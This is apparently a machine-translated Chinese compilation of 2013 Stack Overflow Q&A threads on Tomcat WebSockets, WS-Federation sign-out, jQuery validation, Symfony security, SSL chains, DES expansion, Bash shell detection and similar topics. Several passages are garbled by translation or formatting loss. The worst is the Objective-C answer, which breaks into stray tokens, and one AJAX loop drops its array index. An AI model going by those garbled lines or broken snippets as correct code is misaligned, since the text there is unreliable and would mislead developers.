let app = new Application();
app.application.run(ARGV); 
```

我认为您不需要与刚刚启动的应用程序进行通信 :)

# tomcat - 如何部署 Tomcat 的示例 websocket 应用程序？

> ID：15443550
> 
> 赞同：5
> 
> 时间：2013-03-15T23:12:33.597
> 
> 标签：tomcat, websocket, tomcat7

我正在尝试了解如何部署 Apache Tomcat 7 [WebSocket How-To](http://tomcat.apache.org/tomcat-7.0-doc/web-socket-howto.html)页面中引用的示例。

应用程序开发部分建议阅读[WebSocketServlet](http://tomcat.apache.org/tomcat-7.0-doc/api/index.html?org/apache/catalina/websocket/WebSocketServlet.html)类上的 javadoc。但是查看示例的[服务器端代码，](http://svn.apache.org/viewvc/tomcat/trunk/webapps/examples/WEB-INF/classes/websocket/)三个示例中没有一个类`extend WebSocketServlet`，这是我所期望的。

十多年后，我回到了 servlet 开发，对这些示例中的所有注释感到非常迷茫。是否有另一个 How-To 包含使用 servlet 启动和运行 WebSocket 的分步简单说明？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-03-17T21:21:15.880

[当您下载 Apache Tomcat 的发行](http://tomcat.apache.org/download-70.cgi)版（7.0.37 是目前的最新版本）时，您将`examples`已经部署了 Web 应用程序。它带有[WebSocket 示例](http://tomcat.apache.org/tomcat-7.0-doc/web-socket-howto.html)。您不必自己部署它。

启动 Tomcat 并打开`http://localhost:8080/examples`.

![Apache Tomcat 示例](../Images/2824359733e34290440ebc7a462f86b9.png)

单击**WebSocket 示例**并选择您想要的任何 WebSocket 示例。

![Apache Tomcat WebSocket 示例](../Images/55b43c3bc2c6aefa5350b1a2d910a9ee.png)

`bin/catalina.sh run`除了使用（或任何适合您的命令）启动 Tomcat 之外，您无需执行任何操作。

当您查看`[TOMCAT_HOME]/webapps/examples`目录时，您可能希望查看`WEB-INF/web.xml`部署 WebSocket servlet 的位置。

他们的源代码在`[TOMCAT_HOME]/WEB-INF/classes/websocket`目录中。

servlet`websocket.echo.EchoMessage`确实扩展了`org.apache.catalina.websocket.WebSocketServlet`.

我想知道我是否应该询问您使用的 Apache Tomcat 版本？也许您使用其他一些不太新的版本？我建议从最新版本开始，因为它对我来说很好用。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2014-01-18T12:44:20.570

启动tomcat并转到url

```
/examples/websocket/echo.xhtml 
```

选择两个选项注释或编程 API 之一将 websocket 的 url 更改为

```
/examples/websocket/echo.xhtml 
```

并且不要使用 .

# security - 使用 MVC4 C# 在移动设备上的 STS FederatedPassiveSignout

> ID：15443554
> 
> 赞同：0
> 
> 时间：2013-03-15T23:12:51.923
> 
> 标签：security, service, token, logout, federation

我正在使用 MVC4 c# 并合并了一个本地安全令牌服务 (STS)。用户调用实际的网址，他们被被动地重定向到 STS 登录。当他们成功进行身份验证时，他们会被重定向到他们应该去的地方，这些都在重定向到 sts 的 URL 中进行了 urlencoded。

注销后，我们调用：

```
 this.Session.Abandon();
 this.Response.Cache.SetCacheability(HttpCacheability.NoCache);
 this.Response.ClearContent();

 // expires the claims
 FederatedAuthentication.SessionAuthenticationModule.SignOut();
 FederatedAuthentication.SessionAuthenticationModule.CookieHandler.Delete();
 WSFederationAuthenticationModule authModule = FederatedAuthentication.WSFederationAuthenticationModule
 Response.Redirect(WSFederationAuthenticationModule.GetFederationPassiveSignOutUrl(authModule.Issuer, authModule.Realm, null)); 
```

在我们的应用程序的桌面版本上，一切似乎都运行良好。用户返回 STS 登录页面，URL 显示 wlogin1（以及许多其他内容），并允许用户再次登录而不会出现问题。该 url 与它们第一次被重定向到 STS 时完全相同。完美，这就是我想要的。

现在，当在移动设备上使用完全相同的域/控制器/方法时，它只使用 jQueryMobile 和不同的局部视图，注销似乎工作并且用户被带回 STS 登录。然而，这一次，URL 只显示了从用于注销的移动 actionLink 实际调用的域/控制器/方法。当用户再次尝试登录时，登录总是不成功，因为此链接不适用于 sts 登录。

关于如何解决这个问题的想法，或者有什么问题？如果您需要任何澄清，请告诉我。谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-12-13T21:27:02.733

我能够解决这个问题！

查看它显示的移动站点的标题： X-Requested-With: XMLHttpRequest 因此，我尝试使用 ajax 注销，但有些东西不起作用。这是桌面和移动标题之间的唯一区别（显然除了用户代理）。开始围绕这个问题进行探讨。

在我的一个特定于移动设备的脚本中，我在 mobileinit 中添加了以下内容。答对了！哇，对于这样一个混乱的问题，这是一个多么简单的解决方案。

```
$(document).bind("mobileinit", function (event) {            
  $.mobile.ajaxEnabled = false;}); 
```

确保您也正确加载了您的库！我按以下顺序加载了我的 jquery 库：

1.  jQuery
2.  移动 jquery 初始化文件（上面的东西）
3.  jquerymobile
4.  jQuery 验证
5.  其他一切

我们正在使用以下 jQuery 库： jquery 1.9.1 jquery-ui 1.10.3 jquery.mobile 1.3.1 jquery.validate

希望这对其他人有帮助！

# php - jQuery 验证数组

> ID：15443556
> 
> 赞同：0
> 
> 时间：2013-03-15T23:12:52.797
> 
> 标签：php, jquery, arrays, validation

它不会验证，这是正确的做法吗？

我所有的表单验证功能都工作正常，但是当我单击`submit`按钮时它不会验证

代码：

```
 var pinvalid = 'false';
    var emailvalid = 'false';
    var confirmemailvalid = 'false';
    var passwordvalid = 'false';
    var confirmpassword = 'false';

    //Validate PIN
    $('#SUInpR_UserPin').keyup(function(){
checkAvailability();

});
  // Validate Email
$('#SUInpR_Email').blur(function(){
checkEmail();
})

// Compare email address
$('#SUInpR_CEmail').blur(function(){

compareEmail();

})  

  //Check Password
   $('#SUInpR_Password').blur(function(){

validatepassword();
})

// Comfirm Password
$('#SUInpR_PasswordConfirm').keyup(function(){

validatepasswordcheck();

})

//When signup button is click

$('#BtnGoSignUp').click(function(e){

if (pinvalid == 'true' ){
    alert('Please check and make sure the all fields are entered');

}
else if(emailvalid == 'false'){
    alert('Please Enter your email address');

}
else if(confirmemailvalid == 'false'){
    alert('Please confirm your Email Address');

}
else if (passwordvalid == 'false'){
    alert('Please Enter your password');

}
else if (confirmpassword == 'false'){alert('Please Confirm your Password');

}
else{
    alert('all ok');
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-16T00:40:03.500

如图所示的代码有一个语法错误 - 就在最后它缺少关闭：

```
}); 
```

...属于`$('#BtnGoSignUp').click(function(e){`.

我没有在您显示的内容中看到任何其他错误，但您没有显示您的`blur`和`keyup`处理程序调用的任何函数，所以......

说到您的`blur`和`keyup`处理程序，您可以简化您定义的函数，如下所示：

```
$('#SUInpR_Email').blur(function(){
checkEmail();
}) 
```

...通过直接绑定内部函数：

```
$('#SUInpR_Email').blur(checkEmail);    // note: no () after checkEmail 
```

如果您需要执行除调用之外的其他操作`checkEmail()`，或者需要将参数传递给`checkEmail()`. （你拥有它的方式不是错误，它不会停止它的工作，我建议用更短的方法来做同样的事情。）

另外，你为什么使用字符串`'false'`而`'true'`不是布尔值`false`和`true`？

# html - 将大量保存的数据加载到 HTML 页面中的方法？

> ID：15443558
> 
> 赞同：0
> 
> 时间：2013-03-15T23:13:12.063
> 
> 标签：html

我有一个时间表，我的几个员工每天都在使用和填写。我想为他们添加该功能，以便他们能够点击“保存”，然后他们可以将保存的内容加载回时间表中。

我的保存部分工作得很好。它只是将工作表中的数据保存到数据库中的某些表中。我遇到的真正问题/问题是将其加载回数据库的最佳方法是什么？我以前做过一些非常简单的保存/加载的东西，但只有一个字段。我使用了这样的ajax调用：

```
function grabTransportNum(strURL) {    
var req = getXMLHTTP();
if (req) {
  req.onreadystatechange = function() {
    if (req.readyState == 4) {
      // only if "OK"
      if (req.status == 200) {            
        document.getElementById('tandt1').innerHTML=req.responseText;           
      } else {
        alert("There was a problem while using XMLHTTP:\n" + req.statusText);
      }
    }       
  }     
  req.open("POST", strURL, true);
  req.send(null);
} 
```

}

所有这一切都是拉出一个数字并将'tandt1'的值设置为返回的任何数字。为每个字段执行此操作听起来很容易，但根据保存的数量，我可能需要将数据加载到 100 多个字段中。为每个字段设置这样的函数听起来非常糟糕，所以我认为必须有更好的方法来解决这个问题。我能得到一些建议吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-16T00:04:32.610

您可以做的不是从服务器发送单个字段，而是发送具有多个字段的 JSON，例如：

```
{
  "fields": [
    { "id": "tandt1", "value": "persisted value"},
    //in here you'd have the rest of the fields in the same format
  ]
} 
```

然后将您的功能更改为更像这样的功能：

```
function reloadFields(strURL) {
    var req = getXMLHTTP();
    if (req) {
        req.onreadystatechange = function () {
            if (req.readyState == 4) {
                // only if "OK"
                if (req.status == 200) {
                    var data = JSON.parse(req.responseText);
                    if (data && data.fields && data.fields.length > 0) {
                      for (var field,i=0;i<data.fields.length;i++) {
                        field = data.fields;
                        document.getElementById(field.id).innerHTML = field.value;
                      }
                    }
                } else {
                    alert("There was a problem while using XMLHTTP:\n" + req.statusText);
                }
            }
        }
        req.open("POST", strURL, true);
        req.send(null);
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-15T23:53:51.253

一个整洁的方法是让页面上的 javascript 为任何更改的字段设置一个标志。然后，当员工提交数据时，实际发送的唯一数据是所做的更改。因此，如果您使用 ajax，我的建议是：对于用户所做的每次编辑，将更改添加到您将在用户点击提交时通过 ajax 发送的对象。

# c# - Castle Windsor IoC 属性注入简单操作方法

> ID：15443571
> 
> 赞同：6
> 
> 时间：2013-03-15T23:14:15.057
> 
> 标签：c#, asp.net-mvc, dependency-injection, inversion-of-control, castle-windsor

好的，我认为关于温莎城堡的信息可能*太多了*，因为寻找这些关键字给了我所有的例子，坦率地说，我对如何正确解决这个问题的理解不够。在这一点上，我已经尝试了很多排列，但运气不佳。

我有一个`IUnitOfWorkFactory`我想实例化为单例的。所以，我安装了 Castle Windsor，写了一些代码，如下所示：

```
iocContainer = new WindsorContainer()
    .Install(FromAssembly.This());

var propInjector = iocContainer.Register(
    Component.For<IUnitOfWorkFactory>()
    .LifestyleSingleton()
    .Instance(new NHUnitOfWorkFactory())
    );

propInjector.Resolve<IUnitOfWorkFactory>(); 
```

`Application_Start`这是从我的方法中调用的。

我有一个`AccountController`这样的接线：

```
public class AccountController : SecureController
{
    public IUnitOfWorkFactory UnitOfWorkFactory { get; set; }
    ... 
```

...据我所知，这应该只是“工作”（尽管不要问我如何）。但是当我尝试使用它时，我的属性始终为空。

似乎我错过了一些愚蠢而简单的东西，但我不知道它是什么。

我也试过

```
var propInjector = iocContainer.Register(
    Component.For<IUnitOfWorkFactory>()
    .ImplementedBy<NHUnitOfWorkFactory>()
    .LifestyleSingleton()
    ); 
```

没有成功。

我究竟做错了什么？

**结论**

我在这里错过了几个步骤。[我按照教程](http://docs.castleproject.org/Windsor.Windsor-tutorial-ASP-NET-MVC-3-application-To-be-Seen.ashx)构建了一个安装程序和一个引导程序，但是我在错误的位置注册了我的服务......在构建控制器工厂之前。现在我的引导程序看起来像这样：

```
iocContainer = new WindsorContainer()
    .Install(FromAssembly.This());

var controllerFactory = new WindsorControllerFactory(iocContainer.Kernel);
ControllerBuilder.Current.SetControllerFactory(controllerFactory);

iocContainer.Register(
    Component.For<IUnitOfWorkFactory>()
    .ImplementedBy<NHUnitOfWorkFactory>()
    .LifestyleSingleton()
    ); 
```

...而且我的属性注入不再为空....现在我只需要调试其他 87 个问题...

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-15T23:35:18.717

当容器解析根对象时，构造函数和属性注入都起作用。在这种情况下，您`AccountController`将是 Windsor 需要创建的根对象。

为了将其连接起来，您应该使用[控制器工厂](https://github.com/castleproject/Windsor/blob/master/docs/mvc-tutorial-part-2-plugging-windsor-in.md)。一旦控制器注册并由容器解析，一切都应该按照您的预期工作。

# html - IE7/IE8 中的问题与我网站上的标题

> ID：15443576
> 
> 赞同：0
> 
> 时间：2013-03-15T23:14:52.520
> 
> 标签：html, css, internet-explorer

有人可以帮助一个可怜的女孩解决我只在 IE 7 和 IE 8 中遇到的一些问题。首先我的网页顶部有一个空间，我不知道为什么......而且页面也更宽那么正常吗？导航菜单我很确定我有一个修复。但是这两个问题我不知道从哪里来。[http://tshirthideout.com/](http://tshirthideout.com/)。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-15T23:25:18.390

这一切都与你的 ie.css

您的 .site 说要添加 48px 的边距顶部，还要添加 40px 的左右填充。

# forms - Symfony 2.2 - 在开发环境中登录后重定向错误

> ID：15443578
> 
> 赞同：3
> 
> 时间：2013-03-15T23:15:05.680
> 
> 标签：forms, security, redirect, symfony, login

设置 Symfony2.2 后，我的登录表单中有以下代码：

```
<input type="hidden" name="_target_path" value="{{path('rok_admin_default_index')}}"/> 
```

在哪里`rok_admin_default_index`指向“/”，所以它基本上是应用程序的主页。在我使用的开发过程中`app_dev.php`（我显然是这样），但是在开发环境中成功登录后 Symfony 将我重定向到**domain.com/app_dev.php/app_dev.php/**而不是**domain.com/app_dev.php/**

我的security.yml：

```
jms_security_extra:
secure_all_services: false
expressions: true

security:
    encoders:
        ROK\AdminBundle\Entity\User: sha512

role_hierarchy:
    ROLE_MOD: ROLE_USER
    ROLE_ADMIN:       [ROLE_MOD, ROLE_USER]
    ROLE_SUPER_ADMIN: [ROLE_USER, ROLE_ADMIN, ROLE_ALLOWED_TO_SWITCH]

providers:
    main:
        entity: { class: ROK\AdminBundle\Entity\User, property: email }
    in_memory:
        memory:
            users:
                user:  { password: userpass, roles: [ 'ROLE_USER' ] }
                mod: {password: modpass, roles: ['ROLE_MOD']}
                admin: { password: adminpass, roles: [ 'ROLE_ADMIN' ] }

firewalls:
    dev:
        pattern:  ^/(_(profiler|wdt)|css|images|js)/
        security: false

    login:
        pattern:  ^/login$
        security: false

    secured_area:
        pattern:    ^/admin/
        form_login:
            check_path: login_check
            login_path: login
        logout: ~
        #anonymous: ~
        #http_basic:
        #    realm: "Secured Demo Area"

access_control:
    - { path: ^/login, roles: IS_AUTHENTICATED_ANONYMOUSLY }
    - { path: ^/admin, roles: ROLE_ADMIN} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-16T06:30:26.653

symfony2 文档说

> value 属性可以是相对路径、绝对 URL 或路由名称。

所以我们可以尝试第二种和第三种选择

使用绝对路径

```
<input type="hidden" name="_target_path" value="{{url('rok_admin_default_index')}}"/> 
```

或使用路线名称

```
<input type="hidden" name="_target_path" value="rok_admin_default_index"/> 
```

# ssl - SSL 证书文件和使用

> ID：15443580
> 
> 赞同：1
> 
> 时间：2013-03-15T23:15:13.023
> 
> 标签：ssl, apache2, openssl, certificate

我对 Apache + OpenSSL 的证书文件有疑问。

1.  我从服务器生成了以下基本证书文件：

    /usr/share/ssl/csr/mydomain.csr.pem /usr/share/ssl/private/mydomain.key.pem

2.  在购买 Comodo 的 Positive SSL 后，我已将**mydomain.csr.pem**发送给 CA 机构

    [http://www.namecheap.com/ssl-certificates/comodo.aspx](http://www.namecheap.com/ssl-certificates/comodo.aspx)

3.  它已获得批准并获得三个`*.crt`文件，它们是：

    AddTrustExternalCARoot.crt PositiveSSLCA2.crt mydomain_com.crt

4.  基于 Apache 导师

    [http://www.apache.com/resources/how-to-setup-an-ssl-certificate-on-apache/](http://www.apache.com/resources/how-to-setup-an-ssl-certificate-on-apache/)

看起来我只需要使用**mydomain_com.crt**并将其放入

```
/usr/share/ssl/certs/mydomain_com.crt 
```

1.  我的问题是，我与这两个文件有什么关系？

    AddTrustExternalCARoot.crt PositiveSSLCA2.crt

看起来没有必要，那么这些文件给我们的是什么？如果它们被使用，那么何时以及如何使用？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-15T23:36:54.657

您可能需要`PositiveSSLCA2.crt`在 Apache 配置中指定。如果 HTTP 客户端信任 Comodo，他们应该已经拥有根证书。

我在[此页面](http://www.digicert.com/ssl-certificate-installation-apache.htm)上找到了配置中间证书的说明。基本上，您可以`PositiveSSLCA2.crt`在 Apache 配置中指定`SSLCertificateChainFile`. 您的客户端可能信任根 CA，但它可能不知道中间证书，因此没有它就无法建立信任。

根 CA 可能仅供您参考，但如果您曾经使用要求您直接指定它的 HTTP 客户端以达到信任目的，则可能需要它。

# android - 动画时出现奇怪的错误（Adreno，GL）

> ID：15443583
> 
> 赞同：10
> 
> 时间：2013-03-15T23:15:22.980
> 
> 标签：android, opengl-es, android-animation

我有两个奇怪的错误，有时会在我为我的视图设置动画时出现（在 NineOldAndroids 的帮助下）。很难调试所以我还不确定，但我认为这可能是由`v.setLayerType(View.LAYER_TYPE_HARDWARE, null);`. 并且有一些绘图问题与此日志一起出现，但它们并不一致。

这些是错误（都在不同的活动中引起）：

`<gl_draw_error_checks:437>: Error: Unknown: 0x506`

`<qgl2DrvAPI_glStartTilingQCOM:162>: GL_INVALID_VALUE`

两者都带有 Tag `Adreno200-ES20`。似乎是一个 OpenGL 问题，但我不知道是什么原因导致它以及如何摆脱它。有什么想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-16T22:31:00.727

你可以试试设置

```
<activity android:hardwareAccelerated="false" /> 
```

在 AndroidManifest.xml 中

# google-drive-api - files.find 查询扩展名

> ID：15443585
> 
> 赞同：2
> 
> 时间：2013-03-15T23:15:28.053
> 
> 标签：google-drive-api

有没有办法只列出具有特定扩展名的文件？

我尝试了“标题包含'.mm'”，但这没有返回任何结果，尽管 Drive 中有一个类似的文件。我也试过“mimeType = 'application/vnd.google.drive.ext-type.mm'，也没有运气。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2014-07-28T21:53:47.390

你应该使用：

```
fileExtension = 'mm' 
```

# security - DES的Mangler函数？

> ID：15443591
> 
> 赞同：1
> 
> 时间：2013-03-15T23:16:03.497
> 
> 标签：security, des

Mangler 函数将 32 位作为输入，并将其扩展为 48 位。它打破了 8 个 4 位块中的 32 位，并将左右位连接到每个块。我的问题是这个。前四位块从哪里获得左侧位？它会从最后一块的最后一点开始吗？或者它会简单地连接一个 0。这也适用于最后 4 位块，除非它们需要获得不存在的正确位。

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-15T23:30:16.303

[扩展函数](http://en.wikipedia.org/wiki/DES_supplementary_material#Expansion_function_.28E.29)从最后一个“块”中获取最后一位并将其添加到第一个“块”中，最后一个“块”从第一个“块”中的最左边获取其最右边的位。

```
   32 位 => 48 位
--------------------------------
 1 2 3 4 => *32 *  1 2 3 4   *5* 
 5 6 7 8 =>   *4   **5*** 6 7 8  *9* 
 9 10 11 12 =>   *8   **9*** 10 11 12 *13* 
13 14 15 16 => *12 **13*** 14 15 16 *17* 
17 18 19 20 => *16 **17*** 18 19 20 *21* 
21 22 23 24 => *20 **21*** 22 23 24 *25* 
25 26 27 28 => *24 **25*** 26 27 28 *29* 
29 30 31 32 => *28 **29*** 30 31 32  *1*

```

这张图很清楚地表明了这一点：

![在此处输入图像描述](../Images/a2aa3c987c5c68a5b794eb1b35ca79a5.png)

# matlab - matlab数组子集按索引

> ID：15443599
> 
> 赞同：0
> 
> 时间：2013-03-15T23:16:45.967
> 
> 标签：matlab, indexing, subset

假设我有一个 3x3x3 Matlab 数组，成员为 1 到 27

`a=reshape(1:27, [3 3 3])`

我想用这样的语法创建一个子集

`b=a(range1,range2,range3)`

对于 range1=range2=range3=1:2 我会得到成员`b(1,1,1)`和`b(2,2,2)`. IE

`b= [1 14]`

是否可以仅使用索引而不使用任何功能（例如诊断）来做到这一点？谢谢...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-15T23:32:11.110

索引可以使用`sub2ind`,

```
a(sub2ind(size(a),[1:2],[1:2],[1:2])) 
```

如果你想避免所有功能，你可以自己计算线性指数......

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-15T23:29:33.423

可以通过`sub2ind`以下功能完成：

```
b=a(sub2ind(size(a),range1,range2,range3))

ans: b=[1 14] 
```

# dynamics-crm-2011 - Dynamics CRM 2011 - 从 salesordersdetail 上的retrievemultiple 返回太多行

> ID：15443601
> 
> 赞同：1
> 
> 时间：2013-03-15T23:16:59.010
> 
> 标签：dynamics-crm-2011, crm, microsoft-dynamics

我有一个注册更新、订购、后期操作的插件。在插件中，我对salesorderdetail 执行retrievemultiple。我遇到的问题是订单中有 3 种产品，但我从检索操作中返回了 5 行。我在测试过程中多次添加和删除相同的产品，我不确定这是否是导致问题的原因。我在想，从订单中删除产品后，它可能会设置一个标志并在之后被删除，但我没有看到状态代码或状态代码作为属性。为什么它会返回太多行？

这是我的代码...

```
// Set the properties of the QueryExpression object.
orderDetailQuery.EntityName = "salesorderdetail";
orderDetailQuery.ColumnSet = orderDetailColumnSet;

EntityCollection salesOrderDetail = service.RetrieveMultiple(orderDetailQuery);

orderProductQuery.EntityName = "product";
orderProductQuery.ColumnSet = orderProductColumnSet;

foreach (var orderDetail in salesOrderDetail.Entities)
{
     if(orderDetail.Attributes.Contains("productid"))
     {
         productGuid = ((EntityReference)orderDetail["productid"]).Id;
         Entity product = service.Retrieve("product", productGuid, orderProductColumnSet);
      }
 } 
```

感谢您的帮助！！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-16T09:55:13.457

您发布的代码没有显示您过滤特定的`Order`.

我希望能够检索系统中该类型的所有实体。

要进行过滤，假设您使用的是`QueryByAttribute`, 是按照以下方式添加过滤器：

```
var query = new QueryByAttribute();
query.EntityName = "salesorderdetail";
query.AddAttributeValue("orderid", orderId);//orderId is the Id of the parent Order 
orderDetailQuery.EntityName = "salesorderdetail";
orderDetailQuery.ColumnSet = orderDetailColumnSet;
var results = service.RetrieveMultiple(query); 
```

这样，您将查询限制为仅针对给定订单的产品。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-16T12:36:56.640

我不确定您的过滤是否已实施。这是一个关于如何查询*SalesOrderDetail*实体实例的最新消息，如果它链接到带有 guid *orderId的订单，则获取**fieldName1*和*fieldName2*字段的值。

 *```
QueryExpression query = new QueryExpression
{
  EntityName = "salesorderdetail",
  ColumnSet = new ColumnSet("fieldName1", "fieldName2"),
  Criteria = new FilterExpression
  {
    Conditions = 
    {
      new ConditionExpression 
      {
        AttributeName = "orderid",
        Operator = ConditionOperator.Equal,
        Values = { orderId }
      }
    }
  }
}; 
```*

# objective-c - 在块中调用 autorelease

> ID：15443602
> 
> 赞同：0
> 
> 时间：2013-03-15T23:17:08.987
> 
> 标签：objective-c, objective-c-blocks, grand-central-dispatch, autorelease, nsautoreleasepool

以下代码存在内存管理问题：

```
dispatch_after(someTime, dispatch_get_main_queue(), ^(void){
                [objectA doSomething];
                [self doSomethingDifferent];
            });

//self’s dealloc:

- (void)dealloc
{
   _objectA.delgate = nil; //objectA’s delegate is this object;
   [super dealloc]
} 
```

“self”引用了objectA，但没有保留objectA。在 self 的 dealloc 中，它触及 objectA。如果 objectA 已被释放，这将是一个问题。我知道通过在块中引用这些对象，它们将被保留，但我不确定是否有办法确定它们将以什么顺序被释放。

似乎有效的一件事是：

```
dispatch_after(someTime, dispatch_get_main_queue(), ^(void){
                [[objectA retain] autorelease];
                [objectA doSomething];
                [self doSomethingDifferent];
            }); 
```

似乎在块释放对象后自动释放池被排空，但我不确定这是保证，所以我不知道这段代码是否有效。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-16T04:59:40.807

实现该方法的**类**`-dealloc`应该对. 在这种情况下，您不必担心。如果被引用的对象首先被释放，那么当你访问它时就会被释放，这是安全的。**`_objectA``_objectA``_objectA``nil`**

# bash - 检测 Bash 是否正在运行脚本

> ID：15443604
> 
> 赞同：1
> 
> 时间：2013-03-15T23:17:21.580
> 
> 标签：bash

我汇总了以下内容来检测 Bash 是否正在运行脚本：

```
################################################################################
# Checks whether execution is going through Bash, aborting if it isn't. TinoSino

current_shell="$(
  ps                  `# Report a snapshot of the current processes` \
      -p $$           `# select by PID` \
      -o comm         `# output column: Executable namename` \
  |\
  paste               `# Merge lines of files ` \
      -s              `# paste one file at a time instead of in parallel` \
      -               `# into standard output` \
  |\
  awk                 `# Pick from list of tokens` \
      '{ print $NF }' `# print only last field of the command output`
)"

current_shell="${current_shell#-}" # Remove starting '-' character if present

if [ ! "${current_shell}" = 'bash' ]; then

  echo "This script is meant to be executed by the Bash shell but it isn't."
  echo 'Continuing from another shell may lead to unpredictable results.'
  echo 'Execution will be aborted... now.'

  return 0

fi

unset current_shell
################################################################################ 
```

我不是专门要求你对它进行代码审查，因为你会把我送到 CodeReview；我的问题是：

*   你将如何*测试*这个放在我脚本顶部的“执行警卫”是否确实可靠*地*完成了它的工作？

我正在考虑安装虚拟机并在每台机器上安装诸如`zsh`,`csh`等之类的东西。但这对我来说看起来太耗时了。更好的方法来做到这一点？

如果你发现一个直接的错误，请向我指出。我认为，只是挥舞着腿等待被压扁的刺眼虫子*应该被压扁。*

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-15T23:38:11.357

这最好写成

```
if [ -z "$BASH_VERSION" ]
then
   echo "Please run me in bash"
   exit 1
fi 
```

至于测试，从 /etc/shells 获取非 bash shell 的列表，然后运行脚本，其中每个都验证您是否收到错误消息。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-16T02:07:46.697

*   [getshver](https://www.mirbsd.org/cvs.cgi/~checkout~/contrib/code/Snippets/getshver?rev=HEAD;content-type=text%2Fplain)（推荐）
*   [什么壳](http://www.in-ulm.de/~mascheck/various/whatshell/whatshell.sh.html)
*   [which_interpreter](http://stchaz.free.fr/which_interpreter)（傻）

如果对“保证”正确结果并不重要，我只会建议您自己滚动。我认为这样的保证是不可能的，但大多数时候你最多只针对几个 shell，只关心现代版本。很少有人应该关心版本检测。在 POSIX 之外编写可移植代码需要知道自己在做什么。

不要为了中止而费心检测外壳。如果人们想通过忽略shebang来向自己开枪，那是他们的问题。

# perl - Web 应用程序的事件队列简介

> ID：15443605
> 
> 赞同：1
> 
> 时间：2013-03-15T23:17:31.520
> 
> 标签：perl, events

我正在尝试实现一个基本但灵活的“事件队列”，以便我的网络应用程序可以异步运行 subs。我现在为我工作的方式是应用程序将记录写入我数据库中的“事件队列”表中，其中包含有关做什么和何时触发的信息。然后我有一个守护程序脚本，它会定期查询该表，如果需要做某事，它会触发它。

我想开始使用 AnyEvent 或 EV 之类的观察者，所以我不会经常访问我的数据库，但尽我所能，我找不到关于“最佳实践”的好信息来设置这样的东西. AnyEvent 的文档非常好，但它似乎假设您知道应该如何传递您的事件......我不知道。

我的观察者应该在看什么？一份文件？如果是这样，该文件中应该包含什么？我不需要发送一大堆数据，我只需要一些内容，“现在就去运行这个子”

我将非常感谢有人指出我正确的方向。

**编辑：** 有人要求我更具体：我试图触发的事件是多种多样的。有时是需要发送的电子邮件，有时是一些数据库工作，有时我只需要延迟几个小时或几天的操作。在所有情况下，我都有某种后端脚本来处理操作，我只需要一种方法让我的前端（网络应用程序）告诉我的后端，“嘿，我需要你在 x 分钟内完成此操作”或“我需要你现在就做这个”

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-15T23:50:39.613

您可能会查看[Mojolicious](http://mojolicio.us)，它被构建为非阻塞和异步响应。如果您安装了它，它甚至会在内部使用 EV。要开始阅读文档`Mojolicious::Lite`，然后从这里阅读指南（按顺序）：http: [//mojolicio.us/perldoc](http://mojolicio.us/perldoc)

那么你真正想要做什么呢？在您描述您真正需要的东西之前，我无法再为您提供任何帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-16T07:12:46.120

有一些 CPAN 模块可以通过消息队列运行异步任务。例子：

*   [队列::DBI](http://search.cpan.org/perldoc?Queue%3a%3aDBI)
*   [POE::组件::消息队列](http://search.cpan.org/perldoc?POE%3a%3aComponent%3a%3aMessageQueue)
*   [任何::MQ](http://search.cpan.org/perldoc?AnyMQ)

# jquery - 如何使用 jQuery/AJAX 在 Ruby on Rails 中的不同模型视图中使用另一个控制器操作？

> ID：15443606
> 
> 赞同：0
> 
> 时间：2013-03-15T23:17:33.903
> 
> 标签：jquery, ruby-on-rails-3.2, renderpartial

我为我的第一个模型类型组创建了一个页面，我希望在按下时有一个按钮，在我的项目中（但在不同的视图类别中）显示一个已经存在的表单（html 和嵌入的 ruby​​）用于填充与组模型关联的新模型。我一直无法让我在网上找到的许多教程都可以使用，并希望在这方面获得进一步的指导。

在得知需要 AJAX 后，我尝试了两种方法。

1.  `<%= link_to 'Start Thing', startthing_path, id: 'newThingButton1', :class => 'large success button radius', remote: true, html: {id: 'new_thing_trigger'} %>`
2.  `<a id="newCampaignButton2" class="large success button radius">New Campaign</a>`

这是我的资产/javascripts/application.group.js 中的 javascript：

```
$(document).ready(function () {
// 1
function () {
    $("#new_thing_trigger").bind("ajax:success", function (evt, data, status, xhr) {
        // this assumes the action returns an HTML snippet
        $("div#newThingFormTab").html(data);
    }).bind("ajax:error", function (evt, data, status, xhr) {
            // do something with the error here
            $("div#errors p").text(data);
        });
}
// 2
$("#newCampaignButton2").on('click', function () {
    //$("#newThingTab").html("<div class='row'><div class='twelve columns centered'><div class='row'><section class='box centered'><div class='banner'><h2 class='text-center'>Start A New Thing!</h2></div><%= form_for @thing, :html => {:multipart => true, :class => 'custom'} do |f| %><% if @thing.errors.any? %><div id='error_explanation'><h2><%= pluralize(@thing.errors.count, 'error') %> prohibited this thing from being saved:</h2><ul><% @thing.errors.full_messages.each do |msg| %><li><%= msg %></li><% end %></ul></div><% end %><%= render :partial => 'form-thing', :locals => { :f => f } %><div class='actions'><%= f.submit 'Launch', :class => 'large success button radius' %></div><% end %></section></div></div></div>');
    $.get('<%= url_for :controller => 'things', :action => 'start' %>', function (data) {
        $('#newThingFormTab').html(data);
    });
    $("#thingSelecter").removeClass("active");
    $("#thingsTab").removeClass("active");
    $("#newThingFormTab").addClass("active");
}); 
```

})

